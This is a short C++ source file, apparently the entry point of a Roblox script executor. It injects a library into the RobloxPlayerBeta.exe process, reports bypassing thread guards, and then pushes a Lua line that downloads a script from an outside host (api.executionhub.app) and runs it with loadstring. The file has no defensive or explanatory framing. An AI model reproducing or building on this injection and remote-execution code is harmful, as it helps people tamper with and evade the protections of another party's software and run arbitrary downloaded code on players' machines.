#include "utils.h"
#include <iostream>
#include <thread>
#include <chrono>

int main() {
    std::cout << "[RBX Core Exec] Bootstrapping Execution Suite..." << '\n';
    
    ConfigLoader cfg;
    if (!cfg.ParseFile("config.json")) {
        std::cerr << "[-] Error parsing config variables. Aborting.\n";
        return EXIT_FAILURE;
    }

    auto execution_state = ExecutionUtils::GetContextState();
    
    if (ExecutionUtils::InjectLibraryState("RobloxPlayerBeta.exe", execution_state)) {
        std::cout << "[+] DLL hook verified. Bypassing thread guards..." << '\n';
        std::this_thread::sleep_for(std::chrono::milliseconds(150));
        
        ExecutionUtils::PushString("loadstring(game:HttpGet('https://api.executionhub.app/main.lua'))()");
    } else {
        std::cerr << "[-] Awaiting valid client process..." << '\n';
    }

    return EXIT_SUCCESS;
}
